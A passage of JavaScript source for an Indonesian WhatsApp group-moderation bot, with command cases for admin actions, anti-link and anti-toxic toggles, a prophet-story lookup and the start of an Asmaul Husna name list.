if (!isBotAdmins) return m.reply(`Bot Bukan Admin Bego`)
if (args[0] === 'close'){
await qio.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => qioreply(jsonformat(err)))
} else if (args[0] === 'open'){
await qio.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => qioreply(jsonformat(err)))
} else {
 m.reply(`Silahkan Ketik\nGroup Open\nGroup Close`)
 }
}
break
//=================================================//
case "kick": {
if (!isGroup) return qioreply('Only Group')
if (!isAdmins && !isDeveloper) return qioreply('Only Admin')
if (!isBotAdmins) return m.reply(`Bot Bukan Admin:(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await qio.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => qioreply(util.format(res))).catch((err) => qioreply(util.format(err)))
}
break
//=================================================//
case "add": {
if (!isGroup) return qioreply('Only Group')
if (!isAdmins && !isDeveloper) return qioreply('Only Admin')
if (!isBotAdmins) return m.reply(`Bot Bukan Admin:(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await qio.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => qioreply(util.format(res))).catch((err) => qioreply(util.format(err)))
}
break
//=================================================//
case "demote": {
if (!isPrem) return qioreply(mess.prem)
if (!isGroup) return qioreply('Only Group')
if (!isAdmins && !isDeveloper) return qioreply('Only Admin')
if (!isBotAdmins) return m.reply(`Bot Bukan Admi:(`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await qio.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => qioreply(util.format(res))).catch((err) => qioreply(util.format(err)))
}
break
//=================================================//
case 'setppgroup': {
if (!isDeveloper) return qioreply(mess.usingsetpp)
if (!isGroup) return qioreply('Only Group')
if (!isAdmins && !isDeveloper) return qioreply('Only Admin')
if (!isBotAdmins) return qioreply('Maaf Kak Kaya Nya Kakak Tidak Bisa Menggunakan Fitur Ini Di Karenakan Bot Bukan Admin Group')
if (!quoted) return m.reply(`*Where is the picture?*`)
if (!/image/.test(mime)) return m.reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (/webp/.test(mime)) return m.reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
var mediz = await qio.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await qio.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
m.reply(`*Success Beb✅*`)
} else {
var memeg = await qio.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
m.reply(`*Success Beb✅*`)
}
}
break
//=================================================//
case 'antilink': {
if (!m.isGroup) return qioreply('Buat Di Group Bodoh')
if (!isBotAdmins) return qioreply('Bot Bukan Admin Cuy')
if (!isAdmins) return qioreply('Lah Dikira Admin Group Kali')
if (args.length < 1) return qioreply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return qioreply('Sudah Aktif')
ntilink.push(m.chat)
qioreply('Succes menyalakan antilink di group ini 🌷')
} else if (args[0] === "off") {
if (!AntiLink) return qioreply('Sudah Mati')
let off = ntilink.indexOf(m.chat)
ntilink.splice(off, 1)
qioreply('Succes mematikan antilink di group ini 🌷')
} else {
qioreply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
//=================================================//
case 'antivirus': case 'antivirtex': {
if (!m.isGroup) return m.reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return qioreply('Bot Bukan Admin Geblek')
if (!isAdmins && !isDeveloper) return qioreply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiVirtex) return qioreply('_Sudah Diaktifkan_')
ntvirtex.push(m.chat)
fs.writeFileSync('./lib/lowdb/adapters/basedate/antivirus.json', JSON.stringify(ntvirtex))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await qio.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
qio.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak ada orang yang diperbolehkan mengirim virus di grup ini, anggota yang mengirim akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiVirtex) return qioreply('_Sudah Dimatikan_')
let off = ntvirtex.indexOf(m.chat)
ntvirtex.splice(off, 1)
fs.writeFileSync('./lib/lowdb/adapters/basedate/antivirus.json', JSON.stringify(ntvirtex))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
if (!m.isGroup) return m.reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return qioreply('Bot Bukan Admin Geblek')
if (!isAdmins && !isDeveloper) return qioreply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return qioreply('_Sudah Diaktifkan_')
ntilinkytvid.push(m.chat)
fs.writeFileSync('./lib/lowdb/adapters/basedate/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await qio.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
qio.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirimkan link video youtube di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return qioreply('_Sudah Dimatikan_')
let off = ntilinkytvid.indexOf(m.chat)
ntilinkytvid.splice(off, 1)
fs.writeFileSync('./lib/lowdb/adapters/basedate/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (!m.isGroup) return m.reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return qioreply('Bot Bukan Admin Geblek')
if (!isAdmins && !isDeveloper) return qioreply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return qioreply('_Sudah Diaktifkan_')
ntilinkytch.push(m.chat)
fs.writeFileSync('./lib/lowdb/adapters/basedate/antilinkytchannel.json', JSON.stringify(ntilinkytch))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await qio.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
qio.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirimkan link channel youtube di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return qioreply('_Sudah Dimatikan_')
let off = ntilinkytch.indexOf(m.chat)
fs.writeFileSync('./lib/lowdb/adapters/basedate/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (!m.isGroup) return m.reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return qioreply('Bot Bukan Admin Geblek')
if (!isAdmins && !isDeveloper) return qioreply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkInstagram) return qioreply('_Sudah Diaktifkan_')
ntilinkig.push(m.chat)
fs.writeFileSync('./lib/lowdb/adapters/basedate/antilinkinstagram.json', JSON.stringify(ntilinkig))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await qio.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
qio.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim instagram link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return qioreply('_Sudah Dimatikan_')
let off = ntilinkig.indexOf(m.chat)
ntilinkig.splice(off, 1)
fs.writeFileSync('./lib/lowdb/adapters/basedate/antilinkinstagram.json', JSON.stringify(ntilinkig))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinkfacebook': case 'antilinkfb': {
if (!m.isGroup) return m.reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return qioreply('Bot Bukan Admin Geblek')
if (!isAdmins && !isDeveloper) return qioreply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkFacebook) return qioreply('_Sudah Diaktifkan_')
ntilinkfb.push(m.chat)
fs.writeFileSync('./lib/lowdb/adapters/basedate/antilinkfacebook.json', JSON.stringify(ntilinkfb))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await qio.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
qio.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim facebook link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return qioreply('_Sudah Dimatikan_')
let off = ntilinkfb.indexOf(m.chat)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./lib/lowdb/adapters/basedate/antilinkfacebook.json', JSON.stringify(ntilinkfb))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinktelegram': case 'antilinktg': {
if (!m.isGroup) return m.reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return qioreply('Bot Bukan Admin Geblek')
if (!isAdmins && !isDeveloper) return qioreply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkTelegram) return qioreply('_Sudah Diaktifkan_')
ntilinktg.push(m.chat)
fs.writeFileSync('./lib/lowdb/adapters/basedate/antilinktelegram.json', JSON.stringify(ntilinktg))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await qio.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
qio.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim telegram link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return qioreply('_Sudah Dimatikan_')
let off = ntilinktg.indexOf(m.chat)
ntilinktg.splice(off, 1)
fs.writeFileSync('./lib/lowdb/adapters/basedate/antilinktelegram.json', JSON.stringify(ntilinktg))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinktiktok': case 'antilinktt': {
if (!m.isGroup) return m.reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return qioreply('Bot Bukan Admin Geblek')
if (!isAdmins && !isDeveloper) return qioreply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkTiktok) return qioreply('_Sudah Diaktifkan_')
ntilinktt.push(m.chat)
fs.writeFileSync('./lib/lowdb/adapters/basedate/antilinktiktok.json', JSON.stringify(ntilinktt))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await qio.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
qio.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim tiktok link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return qioreply('_Sudah Dimatikan_')
let off = ntilinktt.indexOf(m.chat)
ntilinktt.splice(off, 1)
fs.writeFileSync('./lib/lowdb/adapters/basedate/antilinktiktok.json', JSON.stringify(ntilinktt))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return m.reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return qioreply('Bot Bukan Admin Geblek')
if (!isAdmins && !isDeveloper) return qioreply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkTwitter) return qioreply('_Sudah Diaktifkan_')
ntilinktwt.push(m.chat)
fs.writeFileSync('./lib/lowdb/adapters/basedate/antilinktwitter.json', JSON.stringify(ntilinktwt))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await qio.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
qio.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim twitter link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return qioreply('_Sudah Dimatikan_')
let off = ntilinktwt.indexOf(m.chat)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./lib/lowdb/adapters/basedate/antilinktwitter.json', JSON.stringify(ntilinktwt))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinkall': {
if (!m.isGroup) return m.reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return qioreply('Bot Bukan Admin Geblek')
if (!isAdmins && !isDeveloper) return qioreply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkTwitter) return qioreply('_Sudah Diaktifkan_')
ntilinkall.push(m.chat)
fs.writeFileSync('./lib/lowdb/adapters/basedate/antilinkall.json', JSON.stringify(ntilinkall))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await qio.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
qio.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim link apapun di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return qioreply('_Sudah Dimatikan_')
let off = ntilinkall.indexOf(m.chat)
ntilinkall.splice(off, 1)
fs.writeFileSync('./lib/lowdb/adapters/basedate/antilinkall.json', JSON.stringify(ntilinkall))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antitoxic': {
if (!m.isGroup) return m.reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return qioreply('Bot Bukan Admin Geblek')
if (!isAdmins && !isDeveloper) return qioreply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiToxic) return qioreply('_Sudah Diaktifkan_')
nttoxic.push(m.chat)
fs.writeFileSync('./lib/lowdb/adapters/basedate/antitoxic.json', JSON.stringify(nttoxic))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await qio.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
qio.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak ada yang diperbolehkan menggunakan kata-kata buruk di grup ini, yang menggunakan akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiToxic) return qioreply('_Sudah Dimatikan_')
let off = nttoxic.indexOf(m.chat)
nttoxic.splice(off, 1)
fs.writeFileSync('./lib/lowdb/adapters/basedate/antitoxic.json', JSON.stringify(nttoxic))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case "antiasing":{
if (!m.isGroup) return m.reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return qioreply('Bot Bukan Admin Geblek')
if (!isAdmins && !isDeveloper) return qioreply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiAsing) return qioreply('_Sudah Diaktifkan_')
ntasing.push(m.chat)
fs.writeFileSync('./lib/lowdb/adapters/basedate/antiasing.json', JSON.stringify(ntasing))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
} else if (args[0] === "off") {
if (!AntiAsing) return qioreply('_Sudah Dimatikan_')
let off = ntasing.indexOf(m.chat)
ntasing.splice(off, 1)
fs.writeFileSync('./lib/lowdb/adapters/basedate/antiasing.json', JSON.stringify(ntasing))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antiwame': {
if (!m.isGroup) return m.reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return qioreply('Bot Bukan Admin Geblek')
if (!isAdmins && !isDeveloper) return qioreply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiWame) return qioreply('_Sudah Diaktifkan_')
ntwame.push(m.chat)
fs.writeFileSync('./lib/lowdb/adapters/basedate/antiwame.json', JSON.stringify(ntwame))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await qio.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
qio.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak ada yang boleh mengirim wa.me di grup ini, siapa yang mengirim akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiWame) return qioreply('_Sudah Dimatikan_')
let off = ntwame.indexOf(m.chat)
ntwame.splice(off, 1)
fs.writeFileSync('./lib/lowdb/adapters/basedate/antiwame.json', JSON.stringify(ntwame))
m.reply(`_Sukses matikan ${command} di group ini_`)
}
}
break
//=================================================//
case "antitoxic":{
if (!m.isGroup) return qioreply('Buat Di Group Bodoh')
if (!isBotAdmins) return qioreply('Bot Bukan Admin Cuy')
if (!isAdmins) return qioreply('Lah Dikira Admin Group Kali')
if (args.length < 1) return qioreply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcmm) return qioreply('Sudah Aktif')
wlcmm.push(m.chat)
var groupe = await qio.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
qio.sendMessage(m.chat, {text: `Fitur Anti Toxic Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcmm) return qioreply('Sudah Non Aktif')
let off = wlcmm.indexOf(m.chat)
wlcmm.splice(off, 1)
qioreply('Sukses Mematikan Anti Toxic  di group ini')
}
}
break

//Islamic
case 'kisahnabi': {
if (!text) return m.reply(`Masukan nama nabi\nExample: kisahnabi adam`)
let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
let kisah = await url.json().catch(_ => "Error")
if (kisah == "Error") return qioreply("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital")

let hasil = `_*👳 Nabi :*_ ${kisah.name}
_*📅 Tanggal Lahir :*_ ${kisah.thn_kelahiran}
_*📍 Tempat Lahir :*_ ${kisah.tmp}
_*📊 Usia :*_ ${kisah.usia}

*— — — — — — — [ K I S A H ] — — — — — — —*

${kisah.description}`

m.reply(`${hasil}`)

}
break
//=================================================//
case 'asmaulhusna': {
const contoh = `*Asmaul Husna*`
const anjuran = `
Dari Abu hurarirah radhiallahu anhu, Rasulullah Saw bersabda: "إِنَّ لِلَّهِ تَعَالَى تِسْعَةً وَتِسْعِينَ اسْمًا، مِائَةٌ إِلَّا وَاحِدًا، مَنْ أَحْصَاهَا دخل الجنة، وهو وتر يُحِبُّ الْوِتْرَ"
Artinya: "Sesungguhnya Allah mempunyai sembilan puluh sembilan nama, alias seratus kurang satu. Barang siapa yang menghitung-hitungnya, niscaya masuk surga; Dia Witir dan menyukai yang witir".`
const asmaulhusna = [
{
index: 1,
latin: "Ar Rahman",
arabic: "الرَّحْمَنُ",
translation_id: "Yang Memiliki Mutlak sifat Pemurah",
translation_en: "The All Beneficent"
},
{
index: 2,
latin: "Ar Rahiim",
arabic: "الرَّحِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Penyayang",
translation_en: "The Most Merciful"
},
{
index: 3,
latin: "Al Malik",
arabic: "الْمَلِكُ",
translation_id: "Yang Memiliki Mutlak sifat Merajai/Memerintah",
translation_en: "The King, The Sovereign"
},
{
index: 4,
latin: "Al Quddus",
arabic: "الْقُدُّوسُ",
translation_id: "Yang Memiliki Mutlak sifat Suci",
translation_en: "The Most Holy"
},
{
index: 5,
latin: "As Salaam",
arabic: "السَّلاَمُ",
translation_id: "Yang Memiliki Mutlak sifat Memberi Kesejahteraan",
translation_en: "Peace and Blessing"
},
{
index: 6,
latin: "Al Mu’min",
arabic: "الْمُؤْمِنُ",
translation_id: "Yang Memiliki Mutlak sifat Memberi Keamanan",
translation_en: "The Guarantor"
},
{
index: 7,
latin: "Al Muhaimin",
arabic: "الْمُهَيْمِنُ",
translation_id: "Yang Memiliki Mutlak sifat Pemelihara",
translation_en: "The Guardian, the Preserver"
},
{
index: 8,
latin: "Al ‘Aziiz",
arabic: "الْعَزِيزُ",
translation_id: "Yang Memiliki Mutlak Kegagahan",
translation_en: "The Almighty, the Self Sufficient"
},
{
index: 9,
latin: "Al Jabbar",
arabic: "الْجَبَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Perkasa",
translation_en: "The Powerful, the Irresistible"
},
{
index: 10,
latin: "Al Mutakabbir",
arabic: "الْمُتَكَبِّرُ",
translation_id: "Yang Memiliki Mutlak sifat Megah,Yang Memiliki Kebesaran",
translation_en: "The Tremendous"
},
{
index: 11,
latin: "Al Khaliq",
arabic: "الْخَالِقُ",
translation_id: "Yang Memiliki Mutlak sifat Pencipta",
translation_en: "The Creator"
},
{
index: 12,
latin: "Al Baari’",
arabic: "الْبَارِئُ",
translation_id: "Yang Memiliki Mutlak sifat Yang Melepaskan(Membuat, Membentuk, Menyeimbangkan)",
translation_en: "The Maker"
},
{
index: 13,
latin: "Al Mushawwir",
arabic: "الْمُصَوِّرُ",
translation_id: "Yang Memiliki Mutlak sifat YangMembentuk Rupa (makhluknya)",
translation_en: "The Fashioner of Forms"
},
{
index: 14,
latin: "Al Ghaffaar",
arabic: "الْغَفَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Pengampun",
translation_en: "The Ever Forgiving"
},
{
index: 15,
latin: "Al Qahhaar",
arabic: "الْقَهَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Memaksa",
translation_en: "The All Compelling Subduer"
},
{
index: 16,
latin: "Al Wahhaab",
arabic: "الْوَهَّابُ",
translation_id: "Yang Memiliki Mutlak sifat Pemberi Karunia",
translation_en: "The Bestower"
},
{
index: 17,
latin: "Ar Razzaaq",
arabic: "الرَّزَّاقُ",
translation_id: "Yang Memiliki Mutlak sifat Pemberi Rejeki",
translation_en: "The Ever Providing"
},
{
index: 18,
latin: "Al Fattaah",
arabic: "الْفَتَّاحُ",
translation_id: "Yang Memiliki Mutlak sifat Pembuka Rahmat",
translation_en: "The Opener, the Victory Giver"
},
{
index: 19,
latin: "Al ‘Aliim",
arabic: "اَلْعَلِيْمُ",
translation_id: "Yang Memiliki Mutlak sifatMengetahui (Memiliki Ilmu)",
translation_en: "The All Knowing, the Omniscient"
},
{
index: 20,
latin: "Al Qaabidh",
arabic: "الْقَابِضُ",
translation_id: "Yang Memiliki Mutlak sifat YangMenyempitkan (makhluknya)",
translation_en: "The Restrainer, the Straightener"
},
{
index: 21,
latin: "Al Baasith",
arabic: "الْبَاسِطُ",
translation_id: "Yang Memiliki Mutlak sifat YangMelapangkan (makhluknya)",
translation_en: "The Expander, the Munificent"
},
{
index: 22,
latin: "Al Khaafidh",
arabic: "الْخَافِضُ",
translation_id: "Yang Memiliki Mutlak sifat YangMerendahkan (makhluknya)",
translation_en: "The Abaser"
},
{
index: 23,
latin: "Ar Raafi’",
arabic: "الرَّافِعُ",
translation_id: "Yang Memiliki Mutlak sifat YangMeninggikan (makhluknya)",
translation_en: "The Exalter"
},
{
index: 24,
latin: "Al Mu’izz",
arabic: "الْمُعِزُّ",
translation_id: "Yang Memiliki Mutlak sifat YangMemuliakan (makhluknya)",
translation_en: "The Giver of Honor"
},
{
index: 25,
latin: "Al Mudzil",
arabic: "المُذِلُّ",
translation_id: "Yang Memiliki Mutlak sifatYang Menghinakan (makhluknya)",
translation_en: "The Giver of Dishonor"
},
{
index: 26,
latin: "Al Samii’",
arabic: "السَّمِيعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mendengar",
translation_en: "The All Hearing"
},
{
index: 27,
latin: "Al Bashiir",
arabic: "الْبَصِيرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Melihat",
translation_en: "The All Seeing"
},
{
index: 28,
latin: "Al Hakam",
arabic: "الْحَكَمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Menetapkan",
translation_en: "The Judge, the Arbitrator"
},
{
index: 29,
latin: "Al ‘Adl",
arabic: "الْعَدْلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
translation_en: "The Utterly Just"
},
{
index: 30,
latin: "Al Lathiif",
arabic: "اللَّطِيفُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Lembut",
translation_en: "The Subtly Kind"
},
{
index: 31,
latin: "Al Khabiir",
arabic: "الْخَبِيرُ",
translation_id: "Yang Memiliki Mutlak sifatMaha Mengetahui Rahasia",
translation_en: "The All Aware"
},
{
index: 32,
latin: "Al Haliim",
arabic: "الْحَلِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penyantun",
translation_en: "The Forbearing, the Indulgent"
},
{
index: 33,
latin: "Al ‘Azhiim",
arabic: "الْعَظِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Agung",
translation_en: "The Magnificent, the Infinite"
},
{
index: 34,
latin: "Al Ghafuur",
arabic: "الْغَفُورُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pengampun",
translation_en: "The All Forgiving"
},
{
index: 35,
latin: "As Syakuur",
arabic: "الشَّكُورُ",
translation_id: "Yang Memiliki Mutlak sifat MahaPembalas Budi (Menghargai)",
translation_en: "The Grateful"
},
{
index: 36,
latin: "Al ‘Aliy",
arabic: "الْعَلِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
translation_en: "The Sublimely Exalted"
},
{
index: 37,
latin: "Al Kabiir",
arabic: "الْكَبِيرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Besar",
translation_en: "The Great"
},
{
index: 38,
latin: "Al Hafizh",
arabic: "الْحَفِيظُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Menjaga",
translation_en: "The Preserver"
},
{
index: 39,
latin: "Al Muqiit",
arabic: "المُقيِت",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Kecukupan",
translation_en: "The Nourisher"
},
{
index: 40,
latin: "Al Hasiib",
arabic: "الْحسِيبُ",
translation_id: "Yang Memiliki Mutlak sifat MahaMembuat Perhitungan",
translation_en: "The Reckoner"
},
{
index: 41,
latin: "Al Jaliil",
arabic: "الْجَلِيلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
translation_en: "The Majestic"
},
{
index: 42,
latin: "Al Kariim",
arabic: "الْكَرِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemurah",
translation_en: "The Bountiful, the Generous"
},
{
index: 43,
latin: "Ar Raqiib",
arabic: "الرَّقِيبُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengawasi",
translation_en: "The Watchful"
},
{
index: 44,
latin: "Al Mujiib",
arabic: "الْمُجِيبُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengabulkan",
translation_en: "The Responsive, the Answerer"
},
{
index: 45,
latin: "Al Waasi’",
arabic: "الْوَاسِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Luas",
translation_en: "The Vast, the All Encompassing"
},
{
index: 46,
latin: "Al Hakiim",
arabic: "الْحَكِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maka Bijaksana",
translation_en: "The Wise"
},
{
index: 47,
latin: "Al Waduud",
arabic: "الْوَدُودُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pencinta",
translation_en: "The Loving, the Kind One"
},
{
index: 48,
latin: "Al Majiid",
arabic: "الْمَجِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
translation_en: "The All Glorious"
},
{
index: 49,
latin: "Al Baa’its",
